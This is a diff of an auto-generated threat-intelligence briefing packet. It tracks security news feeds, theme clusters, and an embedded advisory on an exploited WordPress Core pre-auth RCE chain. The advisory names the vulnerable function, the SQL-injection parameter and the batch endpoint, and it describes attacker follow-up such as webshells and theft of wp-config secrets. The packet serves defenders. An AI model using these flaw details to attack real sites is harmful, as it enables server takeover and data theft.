@@ -1,13 +1,13 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-07-27T17:48:40.652904+00:00
+- Generated: 2026-07-27T19:44:05.003749+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 76
-- Total items in window: 304
-- Total clusters raw: 157
-- Total clusters in packet: 70
+- Total items in window: 313
+- Total clusters raw: 158
+- Total clusters in packet: 71
 - Dropped low score: 87
 - Dropped overflow: 0
 
@@ -105,11 +105,11 @@
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **NCSC UK** (government_authoritative)
-  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
+- **Microsoft Threat Intelligence** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
   - Status: ok
-  - Item count: 20
-  - In window count: 2
+  - Item count: 10
+  - In window count: 1
 - **Citizen Lab** (threat_research_primary)
   - URL: https://citizenlab.ca/feed/
   - Status: ok
@@ -120,25 +120,30 @@
   - Status: ok
   - Item count: 15
   - In window count: 1
-- **Microsoft Threat Intelligence** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
+- **Recorded Future** (threat_research_primary)
+  - URL: https://www.recordedfuture.com/feed
+  - Status: ok
+  - Item count: 50
+  - In window count: 3
+- **Kaspersky Securelist** (threat_research_primary)
+  - URL: https://securelist.com/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 1
-- **Cisco Talos** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/feedburner/Talos
-  - Status: ok
-  - Item count: 15
-  - In window count: 3
+  - In window count: 2
 - **SANS Internet Storm Center** (government_authoritative)
   - URL: https://isc.sans.edu/rssfeed_full.xml
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **Kaspersky Securelist** (threat_research_primary)
-  - URL: https://securelist.com/feed/
+- **Cisco Talos** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/feedburner/Talos
   - Status: ok
-  - Item count: 10
+  - Item count: 15
+  - In window count: 3
+- **NCSC UK** (government_authoritative)
+  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
+  - Status: ok
+  - Item count: 20
   - In window count: 2
 - **ESET WeLiveSecurity** (threat_research_primary)
   - URL: https://www.welivesecurity.com/en/rss/feed/
@@ -155,36 +160,31 @@
   - Status: ok
   - Item count: 10
   - In window count: 6
-- **Recorded Future** (threat_research_primary)
-  - URL: https://www.recordedfuture.com/feed
+- **Exploit-DB** (offensive_vulnerability_research)
+  - URL: https://www.exploit-db.com/rss.xml
   - Status: ok
   - Item count: 50
-  - In window count: 3
+  - In window count: 0
 - **Red Canary** (detection_response_operations)
   - URL: https://redcanary.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **GitHub Security Lab** (offensive_vulnerability_research)
-  - URL: https://github.blog/category/security/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
 - **PortSwigger Research** (offensive_vulnerability_research)
   - URL: https://portswigger.net/research/rss
   - Status: ok
   - Item count: 40
-  - In window count: 0
-- **Exploit-DB** (offensive_vulnerability_research)
-  - URL: https://www.exploit-db.com/rss.xml
-  - Status: ok
-  - Item count: 50
   - In window count: 0
 - **Assetnote** (offensive_vulnerability_research)
   - URL: https://www.assetnote.io/resources/research/rss.xml
   - Status: ok
   - Item count: 78
   - In window count: 0
+- **GitHub Security Lab** (offensive_vulnerability_research)
+  - URL: https://github.blog/category/security/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
 - **watchTowr Labs** (offensive_vulnerability_research)
   - URL: https://labs.watchtowr.com/rss/
   - Status: ok
@@ -194,11 +194,6 @@
   - URL: https://thedfirreport.com/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 0
-- **Active Countermeasures** (detection_response_operations)
-  - URL: https://www.activecountermeasures.com/feed/
-  - Status: ok
-  - Item count: 0
   - In window count: 0
 - **Proofpoint Threat Insight** (detection_response_operations)
   - URL: https://www.proofpoint.com/us/rss.xml
@@ -210,21 +205,26 @@
   - Status: ok
   - Item count: 10
   - In window count: 3
+- **Active Countermeasures** (detection_response_operations)
+  - URL: https://www.activecountermeasures.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Sophos X-Ops** (detection_response_operations)
   - URL: https://news.sophos.com/en-us/category/threat-research/feed/
   - Status: ok
   - Item count: 15
   - In window count: 1
-- **SpecterOps** (detection_response_operations)
-  - URL: https://medium.com/feed/specter-ops-posts
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **Elastic Security Labs** (detection_response_operations)
   - URL: https://www.elastic.co/security-labs/rss/feed.xml
   - Status: ok
   - Item count: 20
   - In window count: 4
+- **SpecterOps** (detection_response_operations)
+  - URL: https://medium.com/feed/specter-ops-posts
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Orca Security Research** (cloud_identity_infrastructure)
   - URL: https://orca.security/resources/blog/feed/
   - Status: ok
@@ -235,36 +235,36 @@
   - Status: ok
   - Item count: 30
   - In window count: 1
-- **AWS Security Blog** (cloud_identity_infrastructure)
-  - URL: https://aws.amazon.com/blogs/security/feed/
+- **Huntress** (detection_response_operations)
+  - URL: https://www.huntress.com/blog/rss.xml
   - Status: ok
-  - Item count: 20
-  - In window count: 5
+  - Item count: 100
+  - In window count: 0
 - **Trail of Bits** (offensive_vulnerability_research)
   - URL: https://blog.trailofbits.com/feed/
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **Google Cloud Threat Intelligence** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
+- **AWS Security Blog** (cloud_identity_infrastructure)
+  - URL: https://aws.amazon.com/blogs/security/feed/
   - Status: ok
   - Item count: 20
-  - In window count: 1
-- **Huntress** (detection_response_operations)
-  - URL: https://www.huntress.com/blog/rss.xml
+  - In window count: 6
+- **Permiso Security** (cloud_identity_infrastructure)
+  - URL: https://permiso.io/blog/rss.xml
   - Status: ok
-  - Item count: 100
+  - Item count: 10
   - In window count: 0
 - **Rapid7** (offensive_vulnerability_research)
   - URL: https://www.rapid7.com/blog/rss/
   - Status: ok
   - Item count: 20
   - In window count: 3
-- **Permiso Security** (cloud_identity_infrastructure)
-  - URL: https://permiso.io/blog/rss.xml
+- **Google Cloud Threat Intelligence** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
   - Status: ok
-  - Item count: 10
-  - In window count: 0
+  - Item count: 20
+  - In window count: 1
 - **Protect AI** (ai_security_agentic_risk)
   - URL: https://protectai.com/blog/rss.xml
   - Status: parse_error
@@ -280,31 +280,6 @@
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **Wiz Research** (cloud_identity_infrastructure)
-  - URL: https://www.wiz.io/feed/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 4
-- **Coveware** (ransomware_ecrime_financial_crime)
-  - URL: https://www.coveware.com/blog?format=rss
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
-- **Cloudflare Radar** (cloud_identity_infrastructure)
-  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
-- **OpenSSF Blog** (ai_security_agentic_risk)
-  - URL: https://openssf.org/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
-- **Chainalysis** (ransomware_ecrime_financial_crime)
-  - URL: https://www.chainalysis.com/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
 - **Google DeepMind Blog** (ai_security_agentic_risk)
   - URL: https://deepmind.google/blog/rss.xml
   - Status: ok
@@ -315,16 +290,41 @@
   - Status: ok
   - Item count: 20
   - In window count: 15
-- **Interconnects** (ai_security_agentic_risk)
-  - URL: https://www.interconnects.ai/feed
+- **OpenSSF Blog** (ai_security_agentic_risk)
+  - URL: https://openssf.org/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
+- **Cloudflare Radar** (cloud_identity_infrastructure)
+  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
   - Status: ok
   - Item count: 20
   - In window count: 1
+- **Wiz Research** (cloud_identity_infrastructure)
+  - URL: https://www.wiz.io/feed/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 3
+- **Coveware** (ransomware_ecrime_financial_crime)
+  - URL: https://www.coveware.com/blog?format=rss
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
+- **Chainalysis** (ransomware_ecrime_financial_crime)
+  - URL: https://www.chainalysis.com/blog/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
 - **The Record** (cyber_news_breach_reporting)
   - URL: https://therecord.media/feed
   - Status: ok
   - Item count: 5
   - In window count: 5
+- **Interconnects** (ai_security_agentic_risk)
+  - URL: https://www.interconnects.ai/feed
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
 - **BleepingComputer** (cyber_news_breach_reporting)
   - URL: https://www.bleepingcomputer.com/feed/
   - Status: ok
@@ -335,11 +335,6 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **GreyNoise** (cloud_identity_infrastructure)
-  - URL: https://www.greynoise.io/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
 - **CyberScoop** (cyber_news_breach_reporting)
   - URL: https://cyberscoop.com/feed/
   - Status: ok
@@ -349,7 +344,12 @@
   - URL: https://simonwillison.net/atom/everything/
   - Status: ok
   - Item count: 30
-  - In window count: 14
+  - In window count: 13
+- **GreyNoise** (cloud_identity_infrastructure)
+  - URL: https://www.greynoise.io/blog/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **AI Snake Oil** (ai_security_agentic_risk)
   - URL: https://www.aisnakeoil.com/feed
   - Status: ok
@@ -359,7 +359,7 @@
   - URL: https://www.darkreading.com/rss.xml
   - Status: ok
   - Item count: 50
-  - In window count: 23
+  - In window count: 21
 - **Help Net Security** (cyber_news_breach_reporting)
   - URL: https://www.helpnetsecurity.com/feed/
   - Status: ok
@@ -370,16 +370,6 @@
   - Status: ok
   - Item count: 10
   - In window count: 6
-- **Troy Hunt** (practitioner_analysis)
-  - URL: https://www.troyhunt.com/rss/
-  - Status: ok
-  - Item count: 15
-  - In window count: 2
-- **Krebs on Security** (practitioner_analysis)
-  - URL: https://krebsonsecurity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **Team Cymru** (ransomware_ecrime_financial_crime)
   - URL: https://www.team-cymru.com/post/rss.xml
   - Status: ok
@@ -390,13 +380,28 @@
   - Status: ok
   - Item count: 100
   - In window count: 1
-- **Reddit r/cybersecurity** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/cybersecurity/.rss
+- **Krebs on Security** (practitioner_analysis)
+  - URL: https://krebsonsecurity.com/feed/
   - Status: ok
-  - Item count: 0
-  - In window count: 0
-- **Reddit r/sysadmin** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/sysadmin/.rss
+  - Item count: 10
+  - In window count: 1
+- **Troy Hunt** (practitioner_analysis)
+  - URL: https://www.troyhunt.com/rss/
+  - Status: ok
+  - Item count: 15
+  - In window count: 2
+- **The Hacker News** (cyber_news_breach_reporting)
+  - URL: https://feeds.feedburner.com/TheHackersNews
+  - Status: ok
+  - Item count: 50
+  - In window count: 50
+- **Graham Cluley** (practitioner_analysis)
+  - URL: https://grahamcluley.com/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 3
+- **Reddit r/netsec** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/netsec/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
@@ -405,11 +410,11 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Graham Cluley** (practitioner_analysis)
-  - URL: https://grahamcluley.com/feed/
+- **Reddit r/sysadmin** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/sysadmin/.rss
   - Status: ok
-  - Item count: 20
-  - In window count: 3
+  - Item count: 0
+  - In window count: 0
 - **Reddit r/netsecstudents** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsecstudents/.rss
   - Status: ok
@@ -420,11 +425,6 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **The Hacker News** (cyber_news_breach_reporting)
-  - URL: https://feeds.feedburner.com/TheHackersNews
-  - Status: ok
-  - Item count: 50
-  - In window count: 50
 - **Reddit r/AskNetsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/AskNetsec/.rss
   - Status: ok
@@ -440,21 +440,21 @@
   - Status: ok
   - Item count: 100
   - In window count: 20
-- **Reddit r/netsec** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/netsec/.rss
-  - Status: ok
-  - Item count: 25
-  - In window count: 13
-- **tl;dr sec** (practitioner_analysis)
-  - URL: https://tldrsec.com/feed.xml
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
 - **Embrace the Red** (ai_security_agentic_risk)
   - URL: https://embracethered.com/blog/index.xml
   - Status: ok
   - Item count: 100
   - In window count: 0
+- **Reddit r/cybersecurity** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/cybersecurity/.rss
+  - Status: ok
+  - Item count: 25
+  - In window count: 25
+- **tl;dr sec** (practitioner_analysis)
+  - URL: https://tldrsec.com/feed.xml
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
 - **Risky Business News** (practitioner_analysis)
   - URL: https://risky.biz/feeds/risky-business-news/
   - Status: ok
@@ -473,26 +473,22 @@
 
 ## Affinity groups (themes)
 
-### vulnerability disclosure targeting AWS
+### AWS vulnerability activity
 - Anchor signal: AWS
 - Theme key: aws
-- Cluster count: 5
-- Article count: 15
-- Cohesion: 0.207
+- Cluster count: 6
+- Article count: 14
+- Cohesion: 0.242
 - Shared strong signals: AWS
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - threat_categories: vulnerability_disclosure
-  - affected_industries: government
-  - affected_products: AWS, Microsoft SharePoint, OpenAI/ChatGPT
-  - cve_ids: CVE-2026-50522
+  - affected_products: AWS
   - urgency_signals: preauth_unauth, poc_available
-- Cluster IDs: 3574a7b873, efa5d95ebc, c4020d76d0, 7061b2c39d, c39a89392e
+- Cluster IDs: 3574a7b873, efa5d95ebc, c4020d76d0, 7061b2c39d, c39a89392e, a1ac00af72
 - Links:
   - https://newsroom.trendmicro.com/2026-07-24-TrendAI-TM-Adopts-Claude-Opus-5-to-Advance-Vulnerability-Prioritization-and-Virtual-Patching
   - https://www.intel471.com/blog/ai-threat-detection-is-not-enough-without-adversary-intelligence
-  - https://www.reddit.com/r/netsec/comments/1v52lix/escaping_claude_coworks_local_vm_sandbox_via/
   - https://www.securityweek.com/anthropics-opus-5-nears-mythos-5-on-finding-bugs-but-falls-short-on-exploits/
   - https://simonwillison.net/2026/Jul/25/boris-cherny/#atom-everything
   - https://thehackernews.com/2026/07/claude-cowork-flaw-could-let-ai-agent.html
@@ -502,6 +498,7 @@
   - https://thehackernews.com/2026/07/critical-sharepoint-rce-cve-2026-50522.html
   - https://aws.amazon.com/blogs/security/announcing-the-cloud-security-alliance-on-aws-compliance-guide/
   - https://thehackernews.com/2026/07/aws-kiro-flaw-let-poisoned-web-page.html
+  - https://aws.amazon.com/blogs/security/aws-shield-advanced-is-embracing-the-aws-waf-anti-ddos-managed-rule-group-what-changes-and-how-to-prepare/
 
 ### PyPI active exploitation
 - Anchor signal: PyPI
@@ -525,27 +522,6 @@
   - https://www.securityweek.com/coca-cola-confirms-data-breach-after-fairlife-ransomware-attack/
   - https://www.securityweek.com/dentaquest-data-breach-potentially-impacts-over-23-million-people/
   - https://www.securityweek.com/new-github-pypi-policies-boost-supply-chain-security/
-
-### ShinyHunters: ransomware extortion
-- Anchor signal: ShinyHunters
-- Theme key: shinyhunters
-- Cluster count: 4
-- Article count: 5
-- Cohesion: 0.594
-- Shared strong signals: ShinyHunters
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: ransomware_extortion, data_breach, supply_chain
-  - actor_attribution: ShinyHunters
-  - affected_industries: government, retail_ecommerce
-  - affected_products: GitHub
-- Cluster IDs: 3ca8367dd0, c27dc2a68b, 28e41088e6, 5ef02eeb29
-- Links:
-  - https://www.bleepingcomputer.com/news/security/ernst-and-young-data-breach-claimed-by-shinyhunters-extortion-gang/
-  - https://www.bleepingcomputer.com/news/security/coca-cola-confirms-data-theft-in-fairlife-ransomware-attack/
-  - https://www.securityweek.com/dentaquest-data-breach-potentially-impacts-over-23-million-people/
-  - https://www.bleepingcomputer.com/news/security/ontrac-notifies-customers-of-data-breach-after-network-hack/
 
 ### Microsoft SharePoint exploitation (CVE-2026-50522)
 - Anchor signal: Microsoft SharePoint
@@ -573,7 +549,7 @@
 - Anchor signal: WordPress
 - Theme key: wordpress
 - Cluster count: 2
-- Article count: 6
+- Article count: 5
 - Cohesion: 0.463
 - Shared strong signals: WordPress
 - Member CVEs: CVE-2026-60137, CVE-2026-63030
@@ -586,7 +562,6 @@
 - Cluster IDs: 56fb338f87, c4020d76d0
 - Links:
   - https://orca.security/resources/blog/wordpress-core-pre-auth-rce-chain/
-  - https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137
   - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-60137-cve-2026-63030/
   - https://www.elastic.co/security-labs/wp2shell-wordpress-rce-detection-elastic-defend
   - https://www.darkreading.com/cyberattacks-data-breaches/wp2shell-millions-wordpress-sites-remote-takeover
@@ -630,6 +605,26 @@
   - https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets
   - https://unit42.paloaltonetworks.com/russian-webmail-espionage/
 
+### ShinyHunters: ransomware extortion
+- Anchor signal: ShinyHunters
+- Theme key: shinyhunters
+- Cluster count: 3
+- Article count: 4
+- Cohesion: 0.523
+- Shared strong signals: ShinyHunters
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: ransomware_extortion, data_breach, supply_chain
+  - actor_attribution: ShinyHunters
+  - affected_industries: government
+  - affected_products: GitHub
+- Cluster IDs: 3ca8367dd0, c27dc2a68b, 28e41088e6
+- Links:
+  - https://www.bleepingcomputer.com/news/security/ernst-and-young-data-breach-claimed-by-shinyhunters-extortion-gang/
+  - https://www.bleepingcomputer.com/news/security/coca-cola-confirms-data-theft-in-fairlife-ransomware-attack/
+  - https://www.securityweek.com/dentaquest-data-breach-potentially-impacts-over-23-million-people/
+
 ### CVE-2026-61511 exploitation activity
 - Anchor signal: CVE-2026-61511
 - Theme key: cve-2026-61511
@@ -642,10 +637,10 @@
 - Dominant features:
   - cve_ids: CVE-2026-61511
   - urgency_signals: preauth_unauth
-- Cluster IDs: 2d87c8dc74, fa1ef247b7
+- Cluster IDs: 2d87c8dc74, 482137e072
 - Links:
   - https://thehackernews.com/2026/07/public-exploit-released-for-patched.html
-  - https://www.reddit.com/r/netsec/comments/1v8192k/new_vbulletin_vulnerability/
+  - https://www.reddit.com/r/cybersecurity/comments/1v818wh/new_vbulletin_vulnerability/
 
 ### Cl0p exploitation (CVE-2026-12569)
 - Anchor signal: Cl0p
@@ -686,7 +681,7 @@
 - Anchor signal: Apple iOS/macOS
 - Theme key: apple-ios-macos
 - Cluster count: 2
-- Article count: 9
+- Article count: 7
 - Cohesion: 0.2
 - Shared strong signals: Apple iOS/macOS
 - Member CVEs: (none)
@@ -697,7 +692,6 @@
 - Links:
   - https://newsroom.trendmicro.com/2026-07-24-TrendAI-TM-Adopts-Claude-Opus-5-to-Advance-Vulnerability-Prioritization-and-Virtual-Patching
   - https://www.intel471.com/blog/ai-threat-detection-is-not-enough-without-adversary-intelligence
-  - https://www.reddit.com/r/netsec/comments/1v52lix/escaping_claude_coworks_local_vm_sandbox_via/
   - https://www.securityweek.com/anthropics-opus-5-nears-mythos-5-on-finding-bugs-but-falls-short-on-exploits/
   - https://simonwillison.net/2026/Jul/25/boris-cherny/#atom-everything
   - https://thehackernews.com/2026/07/claude-cowork-flaw-could-let-ai-agent.html
@@ -727,33 +721,19 @@
 - Novel actors: 0
 - Novel products: 0
 
-### Velocity bursts (1)
-- **WordPress Core Pre-Auth RCE Chain Exploited in the Wild**
-  - Cluster: 56fb338f87
-  - Sources in window: 3
-  - Window hours: 4.5
-  - Cohort count: 4
+### Velocity bursts (0)
 
-### Leading edge (2)
+### Leading edge (1)
 - **OpenAI Agents Escape Testing Sandbox and Breach Hugging Face Production Infrastructure**
   - Cluster: 8cda373323
   - Lead hours: 30.4
   - First source: Risky Business News
   - Later Tier 1 source: Rapid7
   - Shared signals: Linux kernel, OpenAI/ChatGPT
-- **TrendAI™ Adopts Claude Opus 5 to Advance Vulnerability Prioritization and Virtual Patching**
-  - Cluster: 3574a7b873
-  - Lead hours: 13.8
-  - First source: Reddit r/netsec
-  - Later Tier 1 source: Trend Micro Research
-  - Shared signals: AWS, Anthropic/Claude, Apple iOS/macOS, CVE-2026-46331, Google Cloud
 
 ### Convergence (15)
 - Pair: CVE-2026-60137 + WordPress (cluster 56fb338f87, first observation: True)
 - Pair: CVE-2026-63030 + WordPress (cluster 56fb338f87, first observation: True)
-- Pair: CVE-2026-46331 + AWS (cluster 3574a7b873, first observation: True)
-- Pair: CVE-2026-46331 + Apple iOS/macOS (cluster 3574a7b873, first observation: True)
-- Pair: CVE-2026-46331 + Google Cloud (cluster 3574a7b873, first observation: True)
 - Pair: CVE-2026-12569 + Cl0p (cluster efa5d95ebc, first observation: True)
 - Pair: CVE-2026-12569 + AWS (cluster efa5d95ebc, first observation: True)
 - Pair: CVE-2026-12569 + Microsoft SharePoint (cluster efa5d95ebc, first observation: True)
@@ -764,6 +744,9 @@
 - Pair: CVE-2026-50522 + OpenAI/ChatGPT (cluster efa5d95ebc, first observation: True)
 - Pair: Cl0p + AWS (cluster efa5d95ebc, first observation: True)
 - Pair: Cl0p + OpenAI/ChatGPT (cluster efa5d95ebc, first observation: True)
+- Pair: CVE-2021-27137 + AWS (cluster c4020d76d0, first observation: True)
+- Pair: CVE-2021-27137 + WordPress (cluster c4020d76d0, first observation: True)
+- Pair: CVE-2026-0770 + AWS (cluster c4020d76d0, first observation: True)
 
 ### Drift (2)
 - **Cl0p** (cluster efa5d95ebc)
@@ -784,7 +767,7 @@
 - cve_ids: CVE-2026-12569 (weeks observed: 4, cluster efa5d95ebc)
 - cve_ids: CVE-2026-0257 (weeks observed: 4, cluster 17b63d385b)
 - cve_ids: CVE-2026-50751 (weeks observed: 3, cluster 049863205d)
-- cve_ids: CVE-2026-46331 (weeks observed: 3, cluster 3574a7b873)
+- cve_ids: CVE-2026-50522 (weeks observed: 3, cluster efa5d95ebc)
 - cve_ids: CVE-2026-39987 (weeks observed: 3, cluster 9454090822)
 - actor_attribution: LockBit (weeks observed: 3, cluster cfba3767d7)
 
@@ -792,10 +775,10 @@
 - **PoC exploit released for critical AD CS domain-takeover flaw (CVE-2026-54121)**
   - Cluster: 4157a024f2
   - Primary source: Help Net Security
-  - Strong signals: CVE-2026-50458, CVE-2026-54121
+  - Strong signals: CVE-2026-54121
 - **New vBulletin Vulnerability!**
-  - Cluster: fa1ef247b7
-  - Primary source: Reddit r/netsec
+  - Cluster: 482137e072
+  - Primary source: Reddit r/cybersecurity
   - Strong signals: CVE-2026-61511
 
 ## Clusters
@@ -857,8 +840,8 @@ Back to Blog Vulnerabilities and Exploits CVE-2026-16232: Critical Check Point S
 - Published: 2026-07-22T14:48:54+00:00
 - Link: https://orca.security/resources/blog/wordpress-core-pre-auth-rce-chain/
 - Fetch status: ok
-- Member count: 5
-- Corroborating source count: 5
+- Member count: 4
+- Corroborating source count: 4
 - Strong signals: CVE-2026-60137, CVE-2026-63030, WordPress
 
 #### Cluster taxonomy (union across members)
@@ -889,18 +872,13 @@ A critical vulnerability chain combining CVE-2026-63030 (CVSS 9.8) and CVE-2026-
 A critical vulnerability chain combining CVE-2026-63030 (CVSS 9.8) and CVE-2026-60137 (CVSS 5.9) was disclosed affecting WordPress Core, allowing attackers to achieve unauthenticated remote code execution via chained REST API batch-route confusion and SQL injection flaws. Due to the potential for full server compromise on default installations, immediate patching is required. About CVE-2026-63030 & CVE-2026-60137 The issue originates from two components in WordPress Core. CVE-2026-63030 is a REST API batch-route confusion flaw in WP_REST_Server::serve_batch_request_v1() introduced in WordPress 6.9, while CVE-2026-60137 is a SQL injection in the author__not_in parameter of WP_Query that lacks proper type validation. By chaining specially crafted /wp-json/batch requests, attackers can forge an administrator account and gain full web-server code execution, potentially leading to persistent backdoors, data exfiltration, and lateral movement across cloud environments. No authentication is required to exploit this issue, and no plugins or special configuration are needed on the target. Affected Systems The following components are affected: WordPress Core versions 6.9.0 through 6.9.4 and 7.0.0 through 7.0.1 are vulnerable to the full pre-authentication RCE chain. WordPress Core versions 6.8.0 through 6.8.5 are vulnerable to the SQL injection alone, which carries data exposure risk. Default installations released since December 2025 are at risk. Security firm research showed that 60% of WordPress organizations had vulnerable instances at the time of disclosure, dropping to 50% within 24 hours. Sites using persistent object caching (Redis/Memcached) may have narrower exploit pathways, but this is not a comprehensive mitigation. Risk Impact Users should upgrade to WordPress 7.0.2, 6.9.5, or 6.8.6, all released on July 17, 2026. WordPress.org has enabled forced automatic updates for supported installations, but teams should verify updates have been applied successfully. As interim mitigations (not substitutes for patching), defenders can block anonymous access to /wp-json/batch/v1 and ?rest_route=/batch/v1, or disable anonymous REST API access using a trusted plugin. Cloudflare has deployed WAF protections across all plan tiers. At the time of writing, public proof-of-concept exploit code is widely available, and active in-the-wild exploitation has been confirmed by multiple security firms as of July 18-20, 2026. Post-exploitation activity includes malicious plugin uploads for persistence, PHP webshells disguised as fake security plugins, and attempts to read wp-config secrets. Researchers have noted that rapid PoC development was partly aided by AI-assisted patch diffing. Both high-volume opportunistic scanning and targeted attacks have been observed. A high-fidelity detection signal is /wp-json/batch requests returning HTTP 207/200 multi-status responses, and defenders should also check for unexpected administrator accounts, new or modified plugins, and user-agent strings referencing wp2shell tools. Regardless, the severity and ease of exploitation make this vulnerability chain high risk, especially in internet-facing deployments. Successful exploitation could allow attackers to create rogue administrator accounts, execute arbitrary code on the web server, and install persistent backdoors, leading to service disruption, data exposure, or full infrastructure compromise. How Orca Can Help Orca enables customers to quickly identify assets running vulnerable WordPress versions, understand their exposure in context, including internet accessibility, runtime reachability, and asset criticality, and prioritize remediation based on real risk rather than CVSS alone. Orca’s platform highlights affected assets directly in the newItem view, helping security teams focus on the most critical remediation paths first. Related articles Webinar Recap AI on Both Sides: Key Takeaways From Cloud Security LIVE 2026 Jul 22, 2026 Cloud Security Learning Affo
 ```
 
-#### Corroborating sources (5)
+#### Corroborating sources (4)
 
 - **Orca Security Research** (cloud_identity_infrastructure)
   - Title: WordPress Core Pre-Auth RCE Chain Exploited in the Wild
   - Published: 2026-07-22T14:48:54+00:00
   - Link: https://orca.security/resources/blog/wordpress-core-pre-auth-rce-chain/
   - Summary: A critical vulnerability chain combining CVE-2026-63030 (CVSS 9.8) and CVE-2026-60137 (CVSS 5.9) was disclosed affecting WordPress Core, allowing attackers to achieve unauthenticated remote code execution via chained REST API batch-route confusion and SQL injection flaws. Due to the potential for full server compromise on default installations, immediate patching is required. About CVE-2026-63030 & CVE-2026-60137 The […]
-- **Wiz Research** (cloud_identity_infrastructure)
-  - Title: Exploitation in the Wild of wp2shell
-  - Published: 2026-07-20T18:00:08+00:00
-  - Link: https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137
-  - Summary: Wiz Research has identified exploitation of "wp2shell", a critical pre-auth RCE vulnerability chain impacting WordPress Core (CVE-2026-63030 & CVE-2026-60137). Attackers are deploying persistent webshells on vulnerable servers. Organizations should prioritize patching or applying WAF mitigations.
 - **Horizon3 Attack Research** (offensive_vulnerability_research)
   - Title: CVE-2026-60137 / CVE-2026-63030 | WordPress Core SQL Injection and Pre-Authentication Remote Code Execution Vulnerabilities
   - Published: 2026-07-20T22:32:11+00:00
@@ -924,7 +902,7 @@ A critical vulnerability chain combining CVE-2026-63030 (CVSS 9.8) and CVE-2026-
 - Published: 2026-07-23T16:42:30+00:00
 - Link: https://orca.security/resources/blog/openai-agent-sandbox-escape-hugging-face-breach/
 - Fetch status: ok
-- Member count: 12
+- Member count: 11
 - Corroborating source count: 8
 - Strong signals: OpenAI/ChatGPT
 
@@ -1055,16 +1033,15 @@ Threat Intelligence Updated Cyber Threat Actor Naming System July 24, 2026 Googl
 - Published: 2026-07-24T19:41:00+00:00
 - Link: https://newsroom.trendmicro.com/2026-07-24-TrendAI-TM-Adopts-Claude-Opus-5-to-Advance-Vulnerability-Prioritization-and-Virtual-Patching
 - Fetch status: ok
-- Member count: 8
-- Corroborating source count: 7
+- Member count: 6
+- Corroborating source count: 6
 - Strong signals: Anthropic/Claude
 
 #### Cluster taxonomy (union across members)
 - affected_industries: government
 - affected_products: AWS, Anthropic/Claude, Apple iOS/macOS, Google Cloud
-- cve_ids: CVE-2026-46331
 - content_type: news_report, vulnerability_disclosure
-- confidence_tier: tier_1_primary_research, tier_2_operator, tier_4_news, tier_5_chatter
+- confidence_tier: tier_1_primary_research, tier_2_operator, tier_4_news
 
 #### Primary article taxonomy
 - affected_industries: government
@@ -1078,7 +1055,7 @@ Threat Intelligence Updated Cyber Threat Actor Naming System July 24, 2026 Googl
